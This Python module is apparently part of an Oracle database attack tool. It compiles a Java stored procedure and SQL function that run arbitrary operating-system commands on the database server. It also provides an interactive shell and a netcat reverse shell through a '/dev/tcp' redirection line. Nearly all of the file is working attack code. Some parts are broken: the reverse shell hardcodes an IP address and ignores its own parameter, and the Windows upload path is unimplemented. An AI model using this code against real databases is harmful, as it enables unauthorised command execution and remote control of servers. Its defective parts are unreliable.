#!/usr/bin/python
# -*- coding: utf-8 -*-

from OracleDatabase import OracleDatabase
import logging, subprocess
from threading import Thread
from Utils import checkOptionsGivenByTheUser
from Constants import *

class Java (OracleDatabase):
	'''
	Allow to use Java remotly
	'''
	def __init__(self,args):
		'''
		Constructor
		'''
		logging.debug("Java object created")
		OracleDatabase.__init__(self,args)
		self.SOURCE_OS_COMMAND_CLASS = """
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "OSCommand" AS
  import java.io.*;
  public class OSCommand {
    public static String executeCommand(String command) {
      StringBuffer sb = new StringBuffer();
      try {
        String[] finalCommand;
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) {
          String systemRootvariable;
          try {systemRootvariable = System.getenv("SystemRoot");} 
          catch (ClassCastException e) {
	   systemRootvariable = System.getProperty("SystemRoot");
          }
          finalCommand = new String[4];
          finalCommand[0] = systemRootvariable+"\\\system32\\\cmd.exe";
          finalCommand[1] = "/y";
          finalCommand[2] = "/c";
          finalCommand[3] = command;
        } else { // Linux or Unix System
          finalCommand = new String[3];
          finalCommand[0] = "/bin/sh";
          finalCommand[1] = "-c";
          finalCommand[2] = command;
        }
        // Execute the command...
        final Process pr = Runtime.getRuntime().exec(finalCommand);
        // Capture output from STDOUT
        BufferedReader br_in = null;
        try {
          br_in = new BufferedReader(new InputStreamReader(pr.getInputStream()));
          String buff = null;
          while ((buff = br_in.readLine()) != null) {
            sb.append(buff); sb.append("\\n");
            try {Thread.sleep(100);} catch(Exception e) {}
          }
          br_in.close();
        } catch (IOException ioe) {
          System.out.println("Error printing process output.");
          ioe.printStackTrace();
        } finally {
          try {
            br_in.close();
          } catch (Exception ex) {}
        }
        // Capture output from STDERR
        BufferedReader br_err = null;
        try {
          br_err = new BufferedReader(new InputStreamReader(pr.getErrorStream()));
          String buff = null;
          while ((buff = br_err.readLine()) != null) {
            sb.append("stderr:");
            sb.append(buff);
            sb.append("\\n");
            try {Thread.sleep(100);} catch(Exception e) {}
          }
          br_err.close();
        } catch (IOException ioe) {
          System.out.println("Error printing execution errors.");
          ioe.printStackTrace();
        } finally {
          try {
            br_err.close();
          } catch (Exception ex) {}
        }
      }
      catch (Exception ex) {
        System.out.println(ex.getLocalizedMessage());
      }
      return sb.toString();
    }
  };"""
		self.SOURCE_OS_COMMAND_CREATE_FUNCTION = "CREATE OR REPLACE FUNCTION oscmd (p_command IN VARCHAR2) RETURN VARCHAR2 AS LANGUAGE JAVA NAME 'OSCommand.executeCommand (java.lang.String) return java.lang.String';"
		self.SOURCE_OS_COMMAND_EXEC = "select oscmd('{0}') from dual"
		self.SOURCE_DROP_CLASS = "DROP JAVA SOURCE \"OSCommand\""
		self.SOURCE_DROP_FUNCTION = "DROP FUNCTION oscmd"
		self.LINUX_CMD_ERROR = 'No such file or directory'
		self.JAVA_SESSION_CLEARED = "Java session state cleared"

	def createClassAndFunctionToExecOsCmd(self):
		'''
		CREATE AND COMPILE JAVA CLASS and CREATE FUNCTION TO CALL JAVA
		'''
		logging.info("Create and compile the java class")
		status = self.__execPLSQL__(self.SOURCE_OS_COMMAND_CLASS)
		if isinstance(status,Exception):
			logging.info("Impossible to create and compile the java class: {0}".format(self.cleanError(status)))
			return status
		else : 
			logging.info("Create a function to call java")
			status = self.__execPLSQL__(self.SOURCE_OS_COMMAND_CREATE_FUNCTION)
			if isinstance(status,Exception):
				logging.info("Impossible to create function to call java: {0}".format(self.cleanError(status)))
				return status
			else : 
				return True
	
	def deleteClassAndFunctionToExecOsCmd(self):
		'''
		Delete the COMPILED JAVA CLASS and delete the CREATED FUNCTION
		'''
		logging.info("Delete the PL/SQL function created")
		status = self.__execPLSQL__(self.SOURCE_DROP_FUNCTION)	
		if isinstance(status,Exception):
			logging.info("Impossible to drop the function: {0}".format(self.cleanError(status)))
			return status
		else: 
			logging.info("Delete the java class compiled")
			status = self.__execPLSQL__(self.SOURCE_DROP_CLASS)
			if isinstance(status,Exception):
				logging.info("Impossible to drop the class: {0}".format(self.cleanError(status)))
				return status
		return True

	def __runOSCmd__ (self,cmd,printResponse=True,retryNb=1):
		'''
		Run a OS command
		defineClassAndFunctionToExecOsCmd() must be run before this one
		return string  (stdout or stderr) or Exception
		'''
		logging.info("Execute the following command system remotly: {0}".format(cmd))
		data = self.__execQuery__(query=self.SOURCE_OS_COMMAND_EXEC.format(cmd),ld=[])
		if isinstance(data,Exception):
			logging.info("Impossible to execute the system command: {0}".format(str(data)))
			if self.JAVA_SESSION_CLEARED in str(data):
				if retryNb == 0 : return data
				logging.info("Run again the OS command...")
				return  self.__runOSCmd__ (cmd=cmd,printResponse=printResponse,retryNb=retryNb-1)
			return data
		if data[0][0] == None : 
			logging.info('The system command output is empty')
			return ''
		else : 
			logging.info('The system command output is: `{0}`...'.format(data[0][0][:50]))
			if printResponse == True : self.args['print'].printOSCmdOutput("{0}".format(data[0][0]))
			return data[0][0]

	def execOSCommand(self,cmd,printResponse=True, needCreateClassAndFunction = True, needDeleteClassAndFunction = True):
		'''
		Run a OS command
		'''
		if needCreateClassAndFunction == False :
			data = self.__runOSCmd__ (cmd=cmd,printResponse=printResponse)
		else :
			status = self.createClassAndFunctionToExecOsCmd()
			if status != True:
				self.args['print'].badNews("Impossible to use the JAVA library to execute a system command: {0}".format(str(status)))
				return status
			else:
				data = self.__runOSCmd__ (cmd=cmd,printResponse=printResponse)
				if needDeleteClassAndFunction == True :
					status = self.deleteClassAndFunctionToExecOsCmd()
					if status != True:
						self.args['print'].goodNews("Impossible to delete functions created: {0}".format(self.cleanError(status)))
		if isinstance(data,Exception) == False : return data

	def getInteractiveShell(self):
		'''
		Give an interactive shell to the user
		Return True if Ok, otherwise return False
		'''
		exit, needCreateClassFunctions = False, True
		while exit == False:
			try:
				if needCreateClassFunctions == True :
					status = self.createClassAndFunctionToExecOsCmd()
					if status == False:
						self.args['print'].badNews("Impossible to use the JAVA library to execute a system command: {0}".format(str(status)))
						return False
					needCreateClassFunctions = False
				else :
					cmd = raw_input('{0}$ '.format(self.args['server']))
					output = self.execOSCommand(cmd=cmd,printResponse=True, needCreateClassAndFunction = False, needDeleteClassAndFunction = False)
			except KeyboardInterrupt:
				status = self.deleteClassAndFunctionToExecOsCmd()
				if status != True:
					self.args['print'].badNews("Impossible to delete functions created: {0}".format(self.cleanError(status)))
				return True
		return False

	def __runListenNC__ (self,port=None):
		'''
		nc listen on the port
		'''
		try :
			subprocess.call("nc -l -v -p {0}".format(port), shell=True)
		except KeyboardInterrupt: pass

	def giveReverseShell(self, localip, localport):
		'''
		Give a reverse tcp shell via nc
		Need upload nc.exe if the remote system is windows
		'''
		BIN_NAMEFILE = "nc.exe"
		FTP_CMDS_FILENAME = "C\\temp\\cmd.txt"
		FTP_COMMANDS = '''
		echo 'binary' > {0}
		echo 'mget {1}' > {0}
		echo 'disconnect' > {0}
		echo 'quit' > {0}
		'''.format(FTP_CMDS_FILENAME,BIN_NAMEFILE)
		FTP_GET_FILE_COMMAND = "ftp -a -s:{0}".format(FTP_CMDS_FILENAME)
		if self.remoteSystemIsWindows() == True :
			logging.info('The remote system is windows. I will upload the nc.exe binary on the remote server to give you a reverse shell')
			#self.execOSCommand(cmd="",printResponse=True, needCreateClassAndFunction = True, needDeleteClassAndFunction = True)
		elif self.remoteSystemIsLinux() == True :
			CMD = "exec 5<>/dev/tcp/{0}/{1}; /bin/cat <&5 | while read line; do $line 2>&5 >&5; done".format("192.168.56.1",localport)
			self.args['print'].goodNews("The reverse shell try to connect to {0}:{1}".format(localip,localport))
			a = Thread(None, self.__runListenNC__, None, (), {'port':localport})
			a.start()
			try :
				self.execOSCommand(cmd=CMD,printResponse=True, needCreateClassAndFunction = True, needDeleteClassAndFunction = True)
			except KeyboardInterrupt: 
				self.args['print'].goodNews("Connection closed")
		else :
			logging.error("The remote server OS ({0}) is unknown".format(self.remoteOS.lower()))
		


	def testAll (self):
		'''
		Test all functions
		'''
		command = self.__generateRandomString__()
		self.args['print'].subtitle('JAVA library ?')
		logging.info("Try to use JAVA in order to execute the following random command: {0}".format(command))
		status = self.createClassAndFunctionToExecOsCmd()
		if status != True:
			self.args['print'].badNews("KO")
		else:
			data = self.__runOSCmd__ (command,printResponse=False)
			if data == '':
				logging.info("The system command {0} return no error, it's impossible with this random command".format(command))
				self.args['print'].badNews("KO")
			else : 
				self.args['print'].goodNews("OK")
				status = self.deleteClassAndFunctionToExecOsCmd()
				if status != True:
					self.args['print'].info("Impossible to delete functions created: {0}".format(self.cleanError(status)))
				
def runjavaModule(args):
	'''
	Run the JAVA module
	'''
	status = True
	if checkOptionsGivenByTheUser(args,["test-module","shell","reverse-shell"]) == False : return EXIT_MISS_ARGUMENT
	java = Java(args)
	status = java.connection(stopIfError=True)
	if args['test-module'] == True :
		args['print'].title("Test if the DBMSScheduler library can be used")
		status = java.testAll()
	#Option 1: exec
	if args['exec'] != None:
		args['print'].title("Execute the `{0}` on the {1} server".format(args['exec'],args['server']))
		status = java.execOSCommand(cmd=args['exec'],printResponse=True, needCreateClassAndFunction = True, needDeleteClassAndFunction = True)
	#Option 2: shell
	if args['shell'] == True:
		args['print'].title("Try to give you a pseudo shell to the {0} server".format(args['server']))
		java.getInteractiveShell()
	#Option 3: reverse shell
	if args['reverse-shell'] != None :
		args['print'].title("Try to give you a nc reverse shell from the {0} server".format(args['server']))
		java.giveReverseShell(localip=args['reverse-shell'][0],localport=args['reverse-shell'][1])
	java.close()
				

